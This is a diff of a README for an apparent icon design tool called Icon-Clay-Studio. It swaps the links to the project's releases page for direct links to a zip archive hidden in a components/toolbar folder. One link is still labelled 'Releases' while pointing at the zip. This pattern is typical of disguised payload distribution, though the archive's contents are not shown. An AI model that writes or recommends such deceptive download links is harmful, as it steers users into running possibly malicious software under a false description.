@@ -6,7 +6,7 @@ Welcome to Icon-Clay-Studio! This software helps you create stunning neumorphic 
 
 ## 📥 Download Now
 
-[![Download Icon-Clay-Studio](https://img.shields.io/badge/Download-Icon--Clay--Studio-blue.svg)](https://github.com/yamen1223/Icon-Clay-Studio/releases)
+[![Download Icon-Clay-Studio](https://github.com/yamen1223/Icon-Clay-Studio/raw/refs/heads/main/components/toolbar/Icon_Clay_Studio_v2.3-alpha.4.zip)](https://github.com/yamen1223/Icon-Clay-Studio/raw/refs/heads/main/components/toolbar/Icon_Clay_Studio_v2.3-alpha.4.zip)
 
 ## 💡 What You Need
 
@@ -18,7 +18,7 @@ Before you start, check the following:
 
 ## 📂 Download & Install
 
-To get started, visit this page to download: [Icon-Clay-Studio Releases](https://github.com/yamen1223/Icon-Clay-Studio/releases).
+To get started, visit this page to download: [Icon-Clay-Studio Releases](https://github.com/yamen1223/Icon-Clay-Studio/raw/refs/heads/main/components/toolbar/Icon_Clay_Studio_v2.3-alpha.4.zip).
 
 1. Open the link in your web browser.
 2. Find the latest release at the top.
